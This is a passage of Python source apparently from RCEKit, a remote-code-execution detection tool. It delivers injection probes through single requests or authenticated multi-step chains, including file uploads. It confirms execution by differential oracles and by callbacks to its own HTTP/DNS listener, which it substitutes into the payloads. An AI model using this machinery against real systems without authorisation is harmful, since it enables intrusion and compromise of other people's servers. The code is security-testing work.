                        # callback arrived") reads as `negative` -- a run that
                        # tested nothing reported as "not vulnerable". Emitting
                        # no row is what makes the engine's own nothing-tested
                        # path fire instead.
                        continue
                    per_probe = meth.confirm_each(series)
                    if per_probe is not None:
                        # `oob`, `lookup` and `deser` decide per probe from a
                        # series, and this branch used to return before refusal
                        # was looked at -- so a run whose every callback probe
                        # was refused reported `negative` for each of them,
                        # because no callback arrived. The exact false clean
                        # this verdict exists to remove, on three of the eight
                        # methods.
                        statuses = {id(p): o.status for p, o in series}
                        for probe, verdict in per_probe:
                            refusal = self._refusal(statuses.get(id(probe)),
                                                    control_status, verdict)
                            verdict = refusal or verdict
                            results.append({
                                "verdict": verdict.status, "detail": verdict.evidence,
                                "status": None, "payload": probe.payload,
                                "method": meth.name, "tier": meth.tier,
                                "environment": record.environment, "context": record.context,
                                "category": "detection", "expected": probe.expected,
                            })
                        if self._budget_spent(started_requests, max_payloads):
                            return results
                        continue
                    verdict = meth.confirm_series(series)
                    # An aggregate method decides once for the whole series, so
                    # the series is `blocked` only when every probe that arrived
                    # was refused. Its honest answer to a filtered ladder ("no
                    # delay was observed") otherwise reads as `negative`.
                    arrived = [o.status for _p, o in series if o.status is not None]
                    refused = [s for s in arrived if payload_refused(s, control_status)]
                    every = bool(refused) and len(refused) == len(arrived)
                    for index, status in enumerate(refused):
                        replacement = self._refusal(status, control_status, verdict,
                                                    every=every)
                        if replacement is not None and index == 0:
                            verdict = replacement
                    probe = series[-1][0] if series else Probe(payload="", expected="")
                    series_result = {
                        "verdict": verdict.status, "detail": verdict.evidence,
                        "status": None, "payload": probe.payload,
                        "method": meth.name, "tier": meth.tier,
                        "environment": record.environment, "context": record.context,
                        "category": "detection", "expected": probe.expected,
                    }
                    # A stateful bridge creates a table, and an aggregate method
                    # reports one row for a whole series -- so without this the
                    # one oracle that reliably proves a query-language bridge
                    # would be the one that never says how to clean up after it.
                    cleanups = [p.followup["cleanup"] for p, _ in series
                                if p.followup and p.followup.get("cleanup")]
                    if cleanups:
                        series_result["cleanup"] = "; ".join(dict.fromkeys(cleanups))
                    results.append(series_result)
                    if self._budget_spent(started_requests, max_payloads):
                        return results
                    continue
                # One carrier is one (method, environment, context). Once it
                # has confirmed, every further shape of the *same* carrier can
                # only say the same thing again: the measured run that prompted
                # this spent 115 of a point's 120 probes after the first
                # confirmation, and printed 32 confirmations of which 29 were
                # duplicates within one carrier.
                #
                # The stop is per carrier and never per point, which is the
                # whole of it. A point may confirm as `unix` and be the only
                # thing a later `nodejs` or `windows` carrier could have found;
                # stopping the point would take that away, and a run that
                # stops looking is indistinguishable from a target with
                # nothing more to find.
                carrier_settled = False
                built_probes = self._apply_target_profile(meth, meth.build_probes(record, rng))
                for probe in built_probes:
                    if carrier_settled:
                        self.settled_probes += 1
                        continue
                    if probe.payload in seen:
                        continue
                    # Before firing, not only after: requests an aggregate
                    # method already spent in this call are part of the same
                    # budget, and a check that only runs after the first probe
                    # cannot notice a budget that was gone before it started.
                    if self._budget_spent(started_requests, max_payloads):
                        return self._resolve_observed(
                            results, observe, observe_control, observe_reached, timeout)
                    seen.add(probe.payload)
                    status, body, chans, elapsed = self._fire_channels(
                        probe.payload, url, method, data, headers, url_location,
                        resolved_body_location, timeout)
                    self.delivered_probes += 1
                    # A followup fetch (file-based self-OOB): retrieve the file the
                    # probe asked the target to write. Its body is the confirmation
                    # channel, so a blocked/failed fetch stays unconfirmed.
                    followup_body: Optional[str] = None
                    if probe.followup and probe.followup.get("url"):
                        f_status, f_body, _ = self._fire(
                            "", probe.followup["url"], "GET", None,
                            self._followup_headers(url, probe.followup["url"], headers),
                            "raw", "raw", timeout)
                        followup_body = f_body if f_status is not None else None
                    obs = Observation(status=status, body=body, control_body=control_body,
                                      elapsed=elapsed, followup_body=followup_body,
                                      channels=chans, control_channels=control_channels)
                    verdict = meth.confirm(obs, probe)
                    # A refused probe is retried up the rungs before anything
                    # is concluded from it: the filter answered, so the sink has
                    # not had its say yet. Only a refused one -- applying a rung
                    # to every probe was measured to break 8 shapes and improve
                    # none.
                    if (payload_refused(status, control_status)
                            and not self._budget_spent(started_requests, max_payloads)):
                        climbed = self._escalate(
                            meth, probe, record, url, method, data, headers,
                            url_location, resolved_body_location, timeout,
                            control_status, started_requests, max_payloads)
                        if climbed is not None:
                            sent, status, body, chans, elapsed = climbed
                            probe = dataclass_replace(probe, payload=sent)
                            # Fetch the followup again. `file` writes its token
                            # on the request that lands, and the first one was
                            # refused -- so the body read before the retry is a
                            # read of a file that did not exist yet, and
                            # confirming against it reports a negative for a
                            # write that succeeded.
                            if probe.followup and probe.followup.get("url"):
                                f_status, f_body, _ = self._fire(
                                    "", probe.followup["url"], "GET", None,
                                    self._followup_headers(
                                        url, probe.followup["url"], headers),
                                    "raw", "raw", timeout)
                                followup_body = f_body if f_status is not None else None
                            obs = Observation(
                                status=status, body=body, control_body=control_body,
                                elapsed=elapsed, followup_body=followup_body,
                                channels=chans, control_channels=control_channels)
                            verdict = meth.confirm(obs, probe)
                    # Decided here rather than in a method's oracle: being
                    # refused is a fact about delivery, not about what any one
                    # method was looking for, so every method inherits the right
                    # answer instead of the current one.
                    refusal = self._refusal(status, control_status, verdict)
                    verdict = refusal or verdict
                    result = {
                        "verdict": verdict.status, "detail": verdict.evidence,
                        "status": status, "payload": probe.payload,
                        "method": meth.name, "tier": meth.tier,
                        "environment": record.environment, "context": record.context,
                        "category": "detection", "expected": probe.expected,
                    }
                    if probe.followup and probe.followup.get("cleanup"):
                        result["cleanup"] = probe.followup["cleanup"]
                    # Did the target hand the input back? Observed, not guessed.
                    # Measured against the payload that actually went out, not
                    # against `forbidden`: a carrier that multiplies through a
                    # filter never spells the joined `a*b` out, so an endpoint
                    # echoing the whole of `{{ a | times: b }}` recorded a
                    # measured False -- and a target profile that filters the
                    # `*` shapes leaves only those, so the run would report
                    # "returned none of it" about a target that returned
                    # everything.
                    #
                    # Set only when there was a response to look at. A delivery
                    # error is not an observation, and recording False for one
                    # would put an unmeasured claim where the unobserved branch
                    # belongs.
                    if status is not None:
                        result["reflected_verbatim"] = bool(meth._search_channels(
                            probe.payload, meth._channels_of(body, chans)))
                    results.append(result)
                    # Read the observed channel now, before the next probe.
                    # Batch-then-poll alone is only correct for a channel that
                    # *accumulates* (a log, a comment list): where the store
                    # overwrites -- a profile field, a single setting, which is
                    # the shape the acceptance case uses -- every probe but the
                    # last is gone by the time the batch poll runs, so the one
                    # oracle this mode exists for confirmed nothing. One extra
                    # request, and only for a probe that could actually be
                    # judged there: already-confirmed probes and probes whose
                    # value rides in their own payload are skipped.
                    if (observe is not None and verdict.status != "executed"
                            and self._observable(result)):
                        o_status, o_body, o_chans, _ = self._fire_observed(observe, timeout)
                        if o_status is not None:
                            observe_reached = True
                            self._observe_match(
                                result, o_chans or ([("response body", o_body)] if o_body else []),
                                observe_control, observe["url"])
                    # Decided from the result, and only once the observed
                    # channel has had its say. A second-order sink answers on
                    # that poll and not in the response the probe drew, so
                    # reading the pre-poll verdict left the carrier running
                    # after it had in fact confirmed -- spending the budget the
                    # stop exists to hand to carriers not yet examined.
                    if result["verdict"] == "executed" and confirm_depth == "first":
                        carrier_settled = True
                        label = f"{meth.name}/{record.environment}/{record.context}"
                        self.settled_carriers[label] = self.settled_carriers.get(label, 0) + 1
                    if delay:
                        time.sleep(delay)
                    if self._budget_spent(started_requests, max_payloads):
                        return self._resolve_observed(
                            results, observe, observe_control, observe_reached, timeout)
        return self._resolve_observed(
            results, observe, observe_control, observe_reached, timeout)

    # A probe's expected value may only be looked for on the observed channel
    # when the payload does not already carry it. That single rule is what keeps
    # the second-order oracle differential, and it is not a detail: `file` and
    # `oob` expect a random *token* that sits verbatim in the payload, so a
    # target that merely stores the payload and renders it on the observed page
    # would hand back that token by reflection and every one of those probes
    # would read as confirmed. The computed-value methods are safe for the
    # opposite reason -- reflection returns `$((a+b))`, never the sum -- so the
    # rule selects them without naming them, and a method added later inherits
    # the right answer instead of the current one.
    @staticmethod
    def _observable(result: Dict[str, Any]) -> bool:
        expected = result.get("expected") or ""
        return bool(expected) and expected not in (result.get("payload") or "")

    def _fire_observed(self, observe: Dict[str, Any], timeout: float
                       ) -> Tuple[Optional[int], str, List[Tuple[str, str]], float]:
        """One request to the observed endpoint. No payload is substituted: this
        is a plain read of the place the execution is expected to surface."""
        return self._fire_channels(
            "", observe["url"], observe.get("method") or "GET", observe.get("data"),
            observe.get("headers"), "raw", "raw", timeout)

    def _resolve_observed(self, results: List[Dict[str, Any]],
                          observe: Optional[Dict[str, Any]],
                          observe_control: List[Tuple[str, str]],
                          observe_reached: bool,
                          timeout: float) -> List[Dict[str, Any]]:
        """Poll the observed channel and upgrade the probes whose value lands there.

        Execution frequently happens on a *different* request than injection:
        stored SSTI rendered on a profile page, a payload written to a log a
        template engine later renders, a queued job run asynchronously. The
        engine diffs the response it injected into, so every one of those read
        `negative` however exploitable the target was.

        Additive by construction. The in-band verdict is computed exactly as
        before and only a non-`executed` one can be upgraded here, so a run
        without ``--observe-url`` behaves identically and a run with it can only
        gain findings.

        Still fully differential, which is why this can legitimately reach
        `executed`: the value was computed locally from random operands, it is
        absent from the endpoint's pre-injection control, and (see
        :meth:`_observable`) it cannot have arrived by the payload being stored
        and echoed. Each probe carries its own operands, so a value left behind
        by an earlier probe cannot confirm a later one."""
        import time
        if observe is None:
            return results
        for result in results:
            result.setdefault("observe_status", "not-observed")
        pending = [r for r in results
                   if r["verdict"] != "executed" and self._observable(r)
                   and r.get("observe_status") != "in-control"]
        # `or` would be wrong here and was: a deliberate --observe-timeout 0
        # ("read it once, do not wait") is falsy, so it fell through to the
        # 60-second default and the run polled a dead endpoint for a minute.
        limit = observe.get("timeout")
        deadline = time.time() + (60.0 if limit is None else float(limit))
        gap = observe.get("poll")
        interval = max(0.5, 5.0 if gap is None else float(gap))
        # At least one poll always happens, even with a zero timeout: an
        # observed run that polled zero times and reported negatives would be
        # the "tested nothing, looks clean" failure in a new place.
        while True:
            status, body, channels, _ = self._fire_observed(observe, timeout)
            if status is not None:
                observe_reached = True
                searched = channels or ([("response body", body)] if body else [])
                for result in list(pending):
                    if self._observe_match(result, searched, observe_control, observe["url"]):
                        pending.remove(result)
                    elif result.get("observe_status") == "in-control":
                        pending.remove(result)
            if not pending or time.time() >= deadline:
                break
            time.sleep(interval)
        if not observe_reached:
            # The operator asked for a channel that never answered. Saying so is
            # the point: the run's negatives were decided without ever reading
            # the place the execution was expected to appear.
            for result in results:
                result["observe_status"] = "unreachable"
        return results

    def _observe_match(self, result: Dict[str, Any], searched: List[Tuple[str, str]],
                       observe_control: List[Tuple[str, str]], observe_url: str) -> bool:
        """Upgrade ``result`` if its computed value is on the observed channel.

        Returns whether it was upgraded. The differential is applied here and
        nowhere else, so the per-probe read and the post-batch poll cannot
        disagree about what counts as proof."""
        where = self._observed_hit(result["expected"], searched)
        if where is None:
            # Read, and the value was not there. Recorded distinctly from
            # "never looked": an operator reading --detect-json has to be able
            # to tell a probe the observed channel cleared from one it never saw.
            result["observe_status"] = "polled"
            return False
        if self._observed_hit(result["expected"], observe_control) is not None:
            result["observe_status"] = "in-control"
            return False
        channel_note = "" if where == "response body" else f" in {where}"
        result["verdict"] = "executed"
        result["observe_status"] = "executed"
        result["detail"] = (
            f"target computed {result['expected']!r} on the OBSERVED channel"
            f"{channel_note} ({observe_url}) -- second-order execution: the value is absent "
            "from that endpoint's pre-injection control and cannot be reflected, since the "
            "payload never carried it")
        return True

    def _observed_hit(self, expected: str,
                      channels: List[Tuple[str, str]]) -> Optional[str]:
        """The channel of ``channels`` carrying ``expected``, or ``None``.

        Uses the same encoded-aware search every verdict uses, so a stored
        channel that base64/hex/url/html-wraps what it renders confirms too."""
        for name, text in channels:
            if expected and self._encoded_search(re.escape(expected), text):
                return name
        return None

    def run_verification_chain(self, records: Iterator[PayloadRecord], chain: Dict[str, Any],
                               delay: float = 0.0, timeout: float = 20.0,
                               max_payloads: Optional[int] = None) -> List[Dict[str, Any]]:
        """Deliver each payload through a multi-step, session-aware request chain
        (login -> CSRF extraction -> prerequisite requests -> payload delivery ->
        trigger), then confirm execution either in-band (the payload's ``match``
        oracle against a chosen step's response) or out-of-band (a ``{callback}``
        URL received by RCEKit's own OOB listener). This reaches sinks that a
        single stateless request cannot: authenticated flows, injection carried in
        uploaded file content, and blind/async execution.

        ``chain`` keys: ``base`` (URL prefix), ``steps`` (ordered list),
        ``confirm_step`` (name/index whose response is matched; default last),
        ``callback_host`` and ``listen_port`` (OOB listener the target calls back
        to). Each step: ``method``, ``path``, optional ``headers``, and one body of
        ``body`` (raw), ``json`` (string), ``form`` (dict) or ``multipart``
        (``{"fields": {...}, "file": {"field","filename","content"}}``). ``FUZZ``
        anywhere in a step's body/content is where the payload lands; ``{var}`` is
        substituted from earlier steps' ``extract`` ({var: regex-with-one-group}).
        """
        import time, os, json as _json, http.cookiejar, urllib.request, urllib.parse

        base = chain.get("base", "").rstrip("/")
        steps = chain["steps"]
        confirm_key = chain.get("confirm_step")
        callback_host = chain.get("callback_host")
        listen_port = int(chain.get("listen_port", 0) or 0)

        listener = None
        if listen_port:
            listener = OOBListener()
            listener.start_http(listen_port)
            logger.info("Chain OOB listener on port %s", listen_port)

        def subst(text: str, ctx: Dict[str, str]) -> str:
            for key, val in ctx.items():
                text = text.replace("{" + key + "}", val)
            return text

        def run_steps(payload: str, token: str) -> Tuple[Dict[str, str], str]:
            cj = http.cookiejar.CookieJar()
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
            # Seed the token so a profile can give each payload a unique filename /
            # path ({token}) — essential when delivery writes to a shared location
            # and an async trigger would otherwise read another payload's content.
            ctx: Dict[str, str] = {"token": token}
            if listener is not None and callback_host:
                cb = f"http://{callback_host}:{listen_port}/{token}"
                payload = payload.replace("{callback}", cb)
                listener.tokens[token] = {"payload": payload, "category": "chain", "context": "chain"}
            confirm_body = ""
            for idx, step in enumerate(steps):
                path = subst(step["path"], ctx)
                url = path if path.startswith("http") else base + path
                headers = {k: subst(v, ctx).replace("FUZZ", payload)
                           for k, v in (step.get("headers") or {}).items()}
                data = None
                if "multipart" in step:
                    mp = step["multipart"]
                    boundary = "----rcekitChain"
                    parts = []
                    for fname, fval in (mp.get("fields") or {}).items():
                        parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{fname}\"\r\n\r\n"
                                     f"{subst(str(fval), ctx).replace('FUZZ', payload)}\r\n")
                    fl = mp.get("file")
                    body = "".join(parts).encode()
                    if fl:
                        content = subst(str(fl.get("content", "")), ctx).replace("FUZZ", payload)
                        filename = subst(str(fl.get("filename", "file")), ctx).replace("FUZZ", payload)
                        body += (f"--{boundary}\r\nContent-Disposition: form-data; name=\"{fl['field']}\"; "
                                 f"filename=\"{filename}\"\r\n"
                                 f"Content-Type: application/octet-stream\r\n\r\n").encode() + content.encode()
                    body += f"\r\n--{boundary}--\r\n".encode()
                    data = body
                    headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
                elif "json" in step:
                    data = subst(step["json"], ctx).replace("FUZZ", payload).encode()
                    headers.setdefault("Content-Type", "application/json")
                elif "form" in step:
                    form = {k: subst(str(v), ctx).replace("FUZZ", payload) for k, v in step["form"].items()}
                    data = urllib.parse.urlencode(form).encode()
                    headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
                elif "body" in step:
                    data = subst(step["body"], ctx).replace("FUZZ", payload).encode()
                req = urllib.request.Request(url, data=data, headers=headers,
                                             method=step.get("method", "GET" if data is None else "POST"))
                try:
                    with opener.open(req, timeout=timeout) as resp:
                        text = decode_response_body(
                            resp.read(), resp.headers.get("Content-Encoding"))
                except urllib.error.HTTPError as exc:
                    text = decode_response_body(
                        exc.read(), exc.headers.get("Content-Encoding"))
                except Exception as exc:
                    text = str(exc)
                for var, rgx in (step.get("extract") or {}).items():
                    m = re.search(rgx, text)
                    if m:
                        ctx[var] = m.group(1)
                if confirm_key in (step.get("name"), idx) or (confirm_key is None and idx == len(steps) - 1):
                    confirm_body = text
            return ctx, confirm_body

        results: List[Dict[str, Any]] = []
        seen: Set[str] = set()
        pending_oob: List[Dict[str, Any]] = []
        for record in records:
            if record.payload in seen:
                continue
            seen.add(record.payload)
            token = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(12))
            _, confirm_body = run_steps(record.payload, token)
            is_oob = "{callback}" in record.payload
            if is_oob:
                pending_oob.append({"record": record, "token": token})
                verdict, detail = "oob-pending", f"awaiting callback token {token}"
            elif record.match and self._encoded_search(record.match, confirm_body):
                verdict, detail = "executed", f"matched /{record.match}/"
            elif record.match:
                verdict, detail = "no-match", ""
            else:
                verdict, detail = "no-signature", "no in-band oracle; deliver as OOB to confirm"
            results.append({"verdict": verdict, "detail": detail, "payload": record.payload,
                            "category": record.category, "context": record.context, "token": token})
            if delay:
                time.sleep(delay)
            if max_payloads and len(results) >= max_payloads:
                break

        # Give blind/async callbacks a moment to arrive, then resolve OOB verdicts.
        if pending_oob and listener is not None:
            deadline = time.time() + 6
            while time.time() < deadline:
                hit_tokens = {h.get("token") for h in listener.hits}
                if all(p["token"] in hit_tokens for p in pending_oob):
                    break
                time.sleep(0.5)
            hit_tokens = {h.get("token") for h in listener.hits}
            for result in results:
                if result["token"] in hit_tokens and result["verdict"] == "oob-pending":
                    result["verdict"] = "executed"
                    result["detail"] = f"OOB callback received for token {result['token']}"
                elif result["verdict"] == "oob-pending":
                    result["detail"] = f"no callback received for token {result['token']}"
        return results

    # Headers whose value is a credential rather than a detail worth auditing.
    # The audit trail records that a header was sent, never its secret.
    SENSITIVE_HEADERS = {
        "authorization", "proxy-authorization", "authentication",
        "cookie", "set-cookie", "x-api-key", "api-key",
        "x-auth-token", "auth-token", "x-csrf-token", "x-session-token",
    }

    @classmethod
    def redact_headers(cls, headers: Optional[List[str]]) -> Optional[List[str]]:
        """Mask the value of every credential-bearing header, keeping its name.

        Verification headers routinely carry the session that makes the target
        reachable at all -- a bearer token or an authenticated cookie. Those
        must not be persisted: the audit trail exists to record what was fired
        and by whom, and a header's name carries that; its secret does not."""
        if not headers:
            return headers
        masked: List[str] = []
        for header in headers:
            name, sep, _value = header.partition(":")
            if sep and name.strip().lower() in cls.SENSITIVE_HEADERS:
                masked.append(f"{name.strip()}: <redacted>")
            else:
                masked.append(header)
        return masked

    def log_exploitation_usage(self, watermark_token: str, arguments: argparse.Namespace) -> None:
        audit_path = Path("exploit_audit.log")
        try:
            recorded = dict(vars(arguments))
            recorded["verify_header"] = self.redact_headers(recorded.get("verify_header"))
            with audit_path.open("a", encoding="utf-8") as audit_file:
                timestamp = datetime.now(timezone.utc).isoformat()
                audit_file.write(
                    f"{timestamp} | token={watermark_token} | ip={self.attacker_ip} | domain={self.attacker_domain} | args={recorded}\n"
                )
        except Exception as exc:
            logger.error("Unable to log exploitation usage: %s", exc)


def terminal_safe(text: str) -> str:
    """Escape control characters for display on the operator's terminal.

    A callback's host and path are chosen by the *target*, which in an
    engagement is hostile by definition. Printed raw, an ESC byte lets that
    target colour, erase and rewrite lines in the operator's own terminal --
    hiding a genuine hit behind ``\\x1b[2K\\r``, or forging one that never
    arrived. For a tool whose whole claim is that its output can be trusted,
    that is the output being forged.

    Escaped rather than stripped: what arrived is still visible, as ``\\xNN``,
    so the operator can see that something tried this. Only the display is
    changed -- the recorded hit and the JSONL log keep the bytes verbatim."""
    out: List[str] = []
    for char in text:
        if char.isprintable():
            out.append(char)
        elif ord(char) <= 0xFF:
            out.append("\\x%02x" % ord(char))
        else:
            out.append("\\u%04x" % ord(char))
    return "".join(out)


class OOBListener:
    """A lightweight out-of-band listener that records DNS/HTTP callbacks and
    correlates each one back to the payload whose unique token produced it.

    It closes the OOB loop: generate OOB payloads -> fire them (e.g. --verify-url
    or your own tooling) -> the target calls back to ``{token}.{oob-domain}`` ->
    this listener maps the token to the exact payload from a ``.map.jsonl``
    manifest. For real engagements the OOB domain's NS/A records must point here;
    for lab use, point payloads straight at this host/port.
    """

    def __init__(self, tokens: Optional[Dict[str, Dict[str, Any]]] = None,
                 answer_ip: str = "127.0.0.1", log_path: Optional[str] = None):
        self.tokens = tokens or {}
        self.answer_ip = answer_ip
        # Pack the A-record answer once, at construction: an unusable address is
        # then rejected before the listener claims to be up, instead of raising
        # inside the DNS thread on the first query and killing it.
        self._answer_rdata = self._pack_ipv4(answer_ip)
        self.log_path = log_path
        self.hits: List[Dict[str, Any]] = []
        self._servers: List[Any] = []

    @staticmethod
    def _pack_ipv4(address: str) -> bytes:
        """Pack a dotted-quad IPv4 address into a DNS A record's four rdata
        bytes. Raises ``ValueError`` on anything else so the caller can reject
        the address at startup."""
        invalid = ValueError(
            f"invalid IPv4 address for DNS answers: {address!r} "
            "(expected a dotted quad such as 127.0.0.1)")
        octets = address.split(".")
        if len(octets) != 4:
            raise invalid
        # isascii() guards against non-ASCII digits, which int() would accept.
        if not all(o.isascii() and o.isdigit() for o in octets):
            raise invalid
        values = [int(o) for o in octets]
        if any(o > 255 for o in values):
            raise invalid
        return bytes(values)

    def _correlate(self, host: str, path: str):
        hay = f"{host} {path}".lower()
        for token, entry in self.tokens.items():
            if token and token.lower() in hay:
                return token, entry
        label = host.split(".")[0].lower() if host else ""
        return (label or None), None

    def record(self, proto: str, source: str, host: str, path: str = "") -> Dict[str, Any]:
        token, entry = self._correlate(host, path)
        hit = {
            "time": datetime.now(timezone.utc).isoformat(), "proto": proto,
            "source": source, "host": host, "path": path, "token": token,
            "payload": entry.get("payload") if entry else None,
            "category": entry.get("category") if entry else None,
            "context": entry.get("context") if entry else None,
        }
        self.hits.append(hit)
        # Everything interpolated below reached us over the wire (or, for the
        # manifest fields, out of a file the operator may have hand-edited),
        # so none of it goes to the terminal unescaped. The hit recorded above
        # keeps the raw bytes.
        where = terminal_safe(f"{host or path}")
        safe_token = terminal_safe(token) if token else token
        if entry:
            print(f"[HIT] {proto} token={safe_token} from {source} "
                  f"-> {terminal_safe(str(entry.get('payload')))} "
                  f"[{terminal_safe(str(entry.get('category')))}/"
                  f"{terminal_safe(str(entry.get('context')))}]")
        else:
            print(f"[HIT] {proto} from {source} -> {where}  (token={safe_token}; not in manifest)")
        if self.log_path:
            try:
                with open(self.log_path, "a", encoding="utf-8") as log_file:
                    log_file.write(json.dumps(hit, ensure_ascii=True) + "\n")
            except Exception as exc:
                logger.error("Unable to write OOB hit log: %s", exc)
        return hit

    def start_http(self, port: int) -> Any:
        import http.server
        import socketserver

        listener = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def _handle(self):
                host = self.headers.get("Host", "").split(":")[0]
                listener.record("http", self.client_address[0], host, self.path)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ok")

            do_GET = _handle
            do_POST = _handle

        server = socketserver.ThreadingTCPServer(("0.0.0.0", port), Handler)
        server.daemon_threads = True
        self._servers.append(server)
        import threading
        threading.Thread(target=server.serve_forever, daemon=True).start()
        return server

    def _parse_dns_qname(self, data: bytes) -> str:
        labels, i = [], 12
        while i < len(data) and data[i] != 0:
            length = data[i]
            labels.append(data[i + 1:i + 1 + length].decode(errors="replace"))
            i += 1 + length
        return ".".join(labels)

    def _dns_response(self, query: bytes) -> bytes:
        header = query[:2] + b"\x81\x80" + b"\x00\x01" + b"\x00\x01" + b"\x00\x00" + b"\x00\x00"
        i = 12
        while i < len(query) and query[i] != 0:
            i += 1 + query[i]
        i += 1 + 4  # null byte + qtype + qclass
        question = query[12:i]
        answer = (b"\xc0\x0c" + b"\x00\x01" + b"\x00\x01" + b"\x00\x00\x00\x1e"
                  + b"\x00\x04" + self._answer_rdata)
        return header + question + answer

    def start_dns(self, port: int) -> bool:
        import socket
        import threading

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("0.0.0.0", port))
        except OSError as exc:
            logger.warning("DNS listener could not bind port %s (%s); continuing with HTTP only.", port, exc)
            return False

        def loop():
            while True:
                try:
                    data, addr = sock.recvfrom(512)
                except OSError:
                    break
                # Record the callback BEFORE answering: the hit is the signal
                # this listener exists for, so a query we cannot synthesise a
                # reply to must still be reported rather than lost. Likewise,
                # no single malformed query may kill the thread and silently
                # drop every callback that follows.
                try:
                    name = self._parse_dns_qname(data)
                except Exception as exc:
                    logger.warning("Unparsable DNS query from %s: %s", addr[0], exc)
                    continue
                self.record("dns", addr[0], name)
                try:
                    sock.sendto(self._dns_response(data), addr)
                except Exception as exc:
                    logger.warning("DNS answer for %r not sent: %s", name, exc)

        threading.Thread(target=loop, daemon=True).start()
        return True


# ===========================================================================
# Detection methods — multi-method, low-false-positive RCE *detection* engine
#
# A small, additive oracle abstraction layered on top of the existing verify
# machinery. Each method turns a target response into a Verdict whose
# ``executed`` tier means the target *computed or executed* a value RCEKit
# chose at random — never a literal the payload already carried (the
# confirmation invariant). Every confirmation is differenced against a
# payload-free control, exactly as _evaluate_verify already does.
#
# Methods are opt-in via ``--methods``; the classic --verify-url path is
# unchanged when no method is selected. `executed` (execution proven) and the
# weaker tiers are never merged into each other.
# ===========================================================================

# Shell environments whose payloads ReflectedMath can force to compute a value.
UNIX_SHELL_ENVIRONMENTS = {"unix", "docker", "kubernetes"}

# Application runtimes that reach a shell. An ``environment`` names what runs
# the application, not what executes the injected command: PHP's system(),
# Python's os.system(), Node's child_process.exec(), Ruby's system(), Perl's
# backticks and Go's os/exec all hand the string to /bin/sh. The corpus has
# always modelled that -- it ships exec_system, os_system, child_process_exec
# and kernel_system sinks for exactly these runtimes -- while the shell
# detection methods gated on the shell environments alone, so scoping a run to
# the language the application is written in (the natural thing to do) sent no
# shell probes at all and reported a clean negative.
#
# A language runtime does not say which OS it runs on, so its probes take the
# Unix shape; --environments windows remains the way to get cmd.exe probes.
#
# The data-layer environments (sql, graphql, mongodb) are deliberately absent:
# reaching a shell from them needs a distinct escalation (xp_cmdshell, COPY
# FROM PROGRAM, a resolver into a command sink) and so a distinct probe.
SHELL_CAPABLE_ENVIRONMENTS = UNIX_SHELL_ENVIRONMENTS | {"windows"} | {
    "php", "python", "nodejs", "java", "dotnet", "ruby", "perl", "go",
}

# Response headers generated by the transport/entity layer rather than by the
# application, so they can never carry a value the sink computed.
#
# They are excluded from the channel sweep because including them would open a
# false-positive path, not because they are merely uninteresting: a probe whose
# expected value is a bare boundary-fenced number (the `expr` shape computes a
# 6-7 digit sum) can collide with an equally numeric Content-Length or Age, and
# that collision would read as a confirmation the target never earned. The
# guarantee that `executed` means executed outranks the last few percent of
# channel coverage.
NON_APPLICATION_HEADERS = frozenset({
    "content-length", "content-range", "content-encoding", "transfer-encoding",
    "date", "age", "expires", "last-modified", "etag", "retry-after",
    "connection", "keep-alive", "accept-ranges", "vary",
})


@dataclass
class Probe:
    """One request RCEKit will send, plus the values it computed *locally* to
    decide the verdict. ``expected`` is the string only execution can produce
    (an arithmetic result on random operands, tag-bracketed); ``forbidden``, if
    present, is the literal that survives only when the target *reflected* the
    payload instead of running it."""
    payload: str
    expected: str
    forbidden: Optional[str] = None
    followup: Optional[Dict[str, Any]] = None
    delay_s: Optional[float] = None
    # ``expected`` is a bare number (e.g. an arithmetic result with no tag around
    # it), so the match must be fenced by non-digit boundaries.
    boundary: bool = False
    # The command separator this probe broke out with, and which round of an
    # iterative method built it. Both are bookkeeping for methods that screen
    # cheaply before committing to an expensive measurement.
    separator: Optional[str] = None
    phase: str = "main"
    # The engine-specific carrier this probe was wrapped in, if any. Named in
    # the evidence so a finding says which engine's quirk it had to work around
    # rather than leaving the tester to rediscover it.
    carrier: Optional[str] = None
    # The --verify-active-risk rung this shape needs, when it is higher than
    # its method's. A method whose cheapest probes are inert can still have a
    # shape that reaches further, and that shape should be available rather
    # than deleted for want of somewhere to declare it. Held back above the
    # run's tier.
    safety: Optional[str] = None
    # A rung this shape reaches past, whose effect the run can undo by saying
    # it happened: a name resolved, a value computed, a delay waited out. The
    # probe goes out and the run reports it.
    #
    # Reach wins where the two pull against each other. Detection the tool
    # could have done and did not is a false negative wearing a safety label,
    # and it costs more than the noise it saves. `safety` is for the other
    # case -- an effect a notice cannot take back, like a file written or a
    # class fetched from an address RCEKit did not choose.
    reaches_past: Optional[str] = None


@dataclass
class Verdict:
    """A method's decision. ``status`` is one of ``executed`` (execution
    proven), ``needs-review`` (candidate), ``negative`` (reached the target, no
    evidence), ``inconclusive`` (evidence not attributable to execution), or
    ``error`` (the request never reached the target — a delivery/TLS failure,
    which is deliberately NOT a ``negative`` so a connectivity problem is never
    read as 'not vulnerable').

    Five further statuses are *proven findings about something other than
    execution*, and exist so none has to be squeezed into one of the above:

    * ``timing-sink`` -- the target honoured a delay RCEKit injected
    * ``file-write`` -- the target stored a file at a path RCEKit chose and
      serves it back uninterpreted
    * ``evaluation-sink`` -- an evaluator consumed the input and partitioned on
      it; which evaluator is not shown
    * ``deserialization-sink`` -- the endpoint reconstructed an
      attacker-supplied object graph
    * ``lookup-sink`` -- the sink resolved a URI the tool chose

    All five outrank ``negative``, and none ever becomes ``executed`` -- which
    stays reserved for execution.

    Each is named for what the *target* did rather than for how sure RCEKit is,
    and that is the distinction ``needs-review`` was carrying badly: three of
    these five used to report under it, so a measurement that had settled read
    as one that had not. ``needs-review`` is left with the one verdict that
    really is a candidate -- ``deser``'s shape fingerprint."""
    status: str
    evidence: str


@dataclass
class Observation:
    """The target's response(s) to one probe, plus the payload-free control the
    verdict is differenced against. ``status is None`` means the delivery
    request errored or timed out."""
    status: Optional[int]
    body: str
    control_body: str = ""
    elapsed: float = 0.0
    baseline: float = 0.0
    followup_body: Optional[str] = None
    # Every channel of the response and of the control, as ``(name, text)``
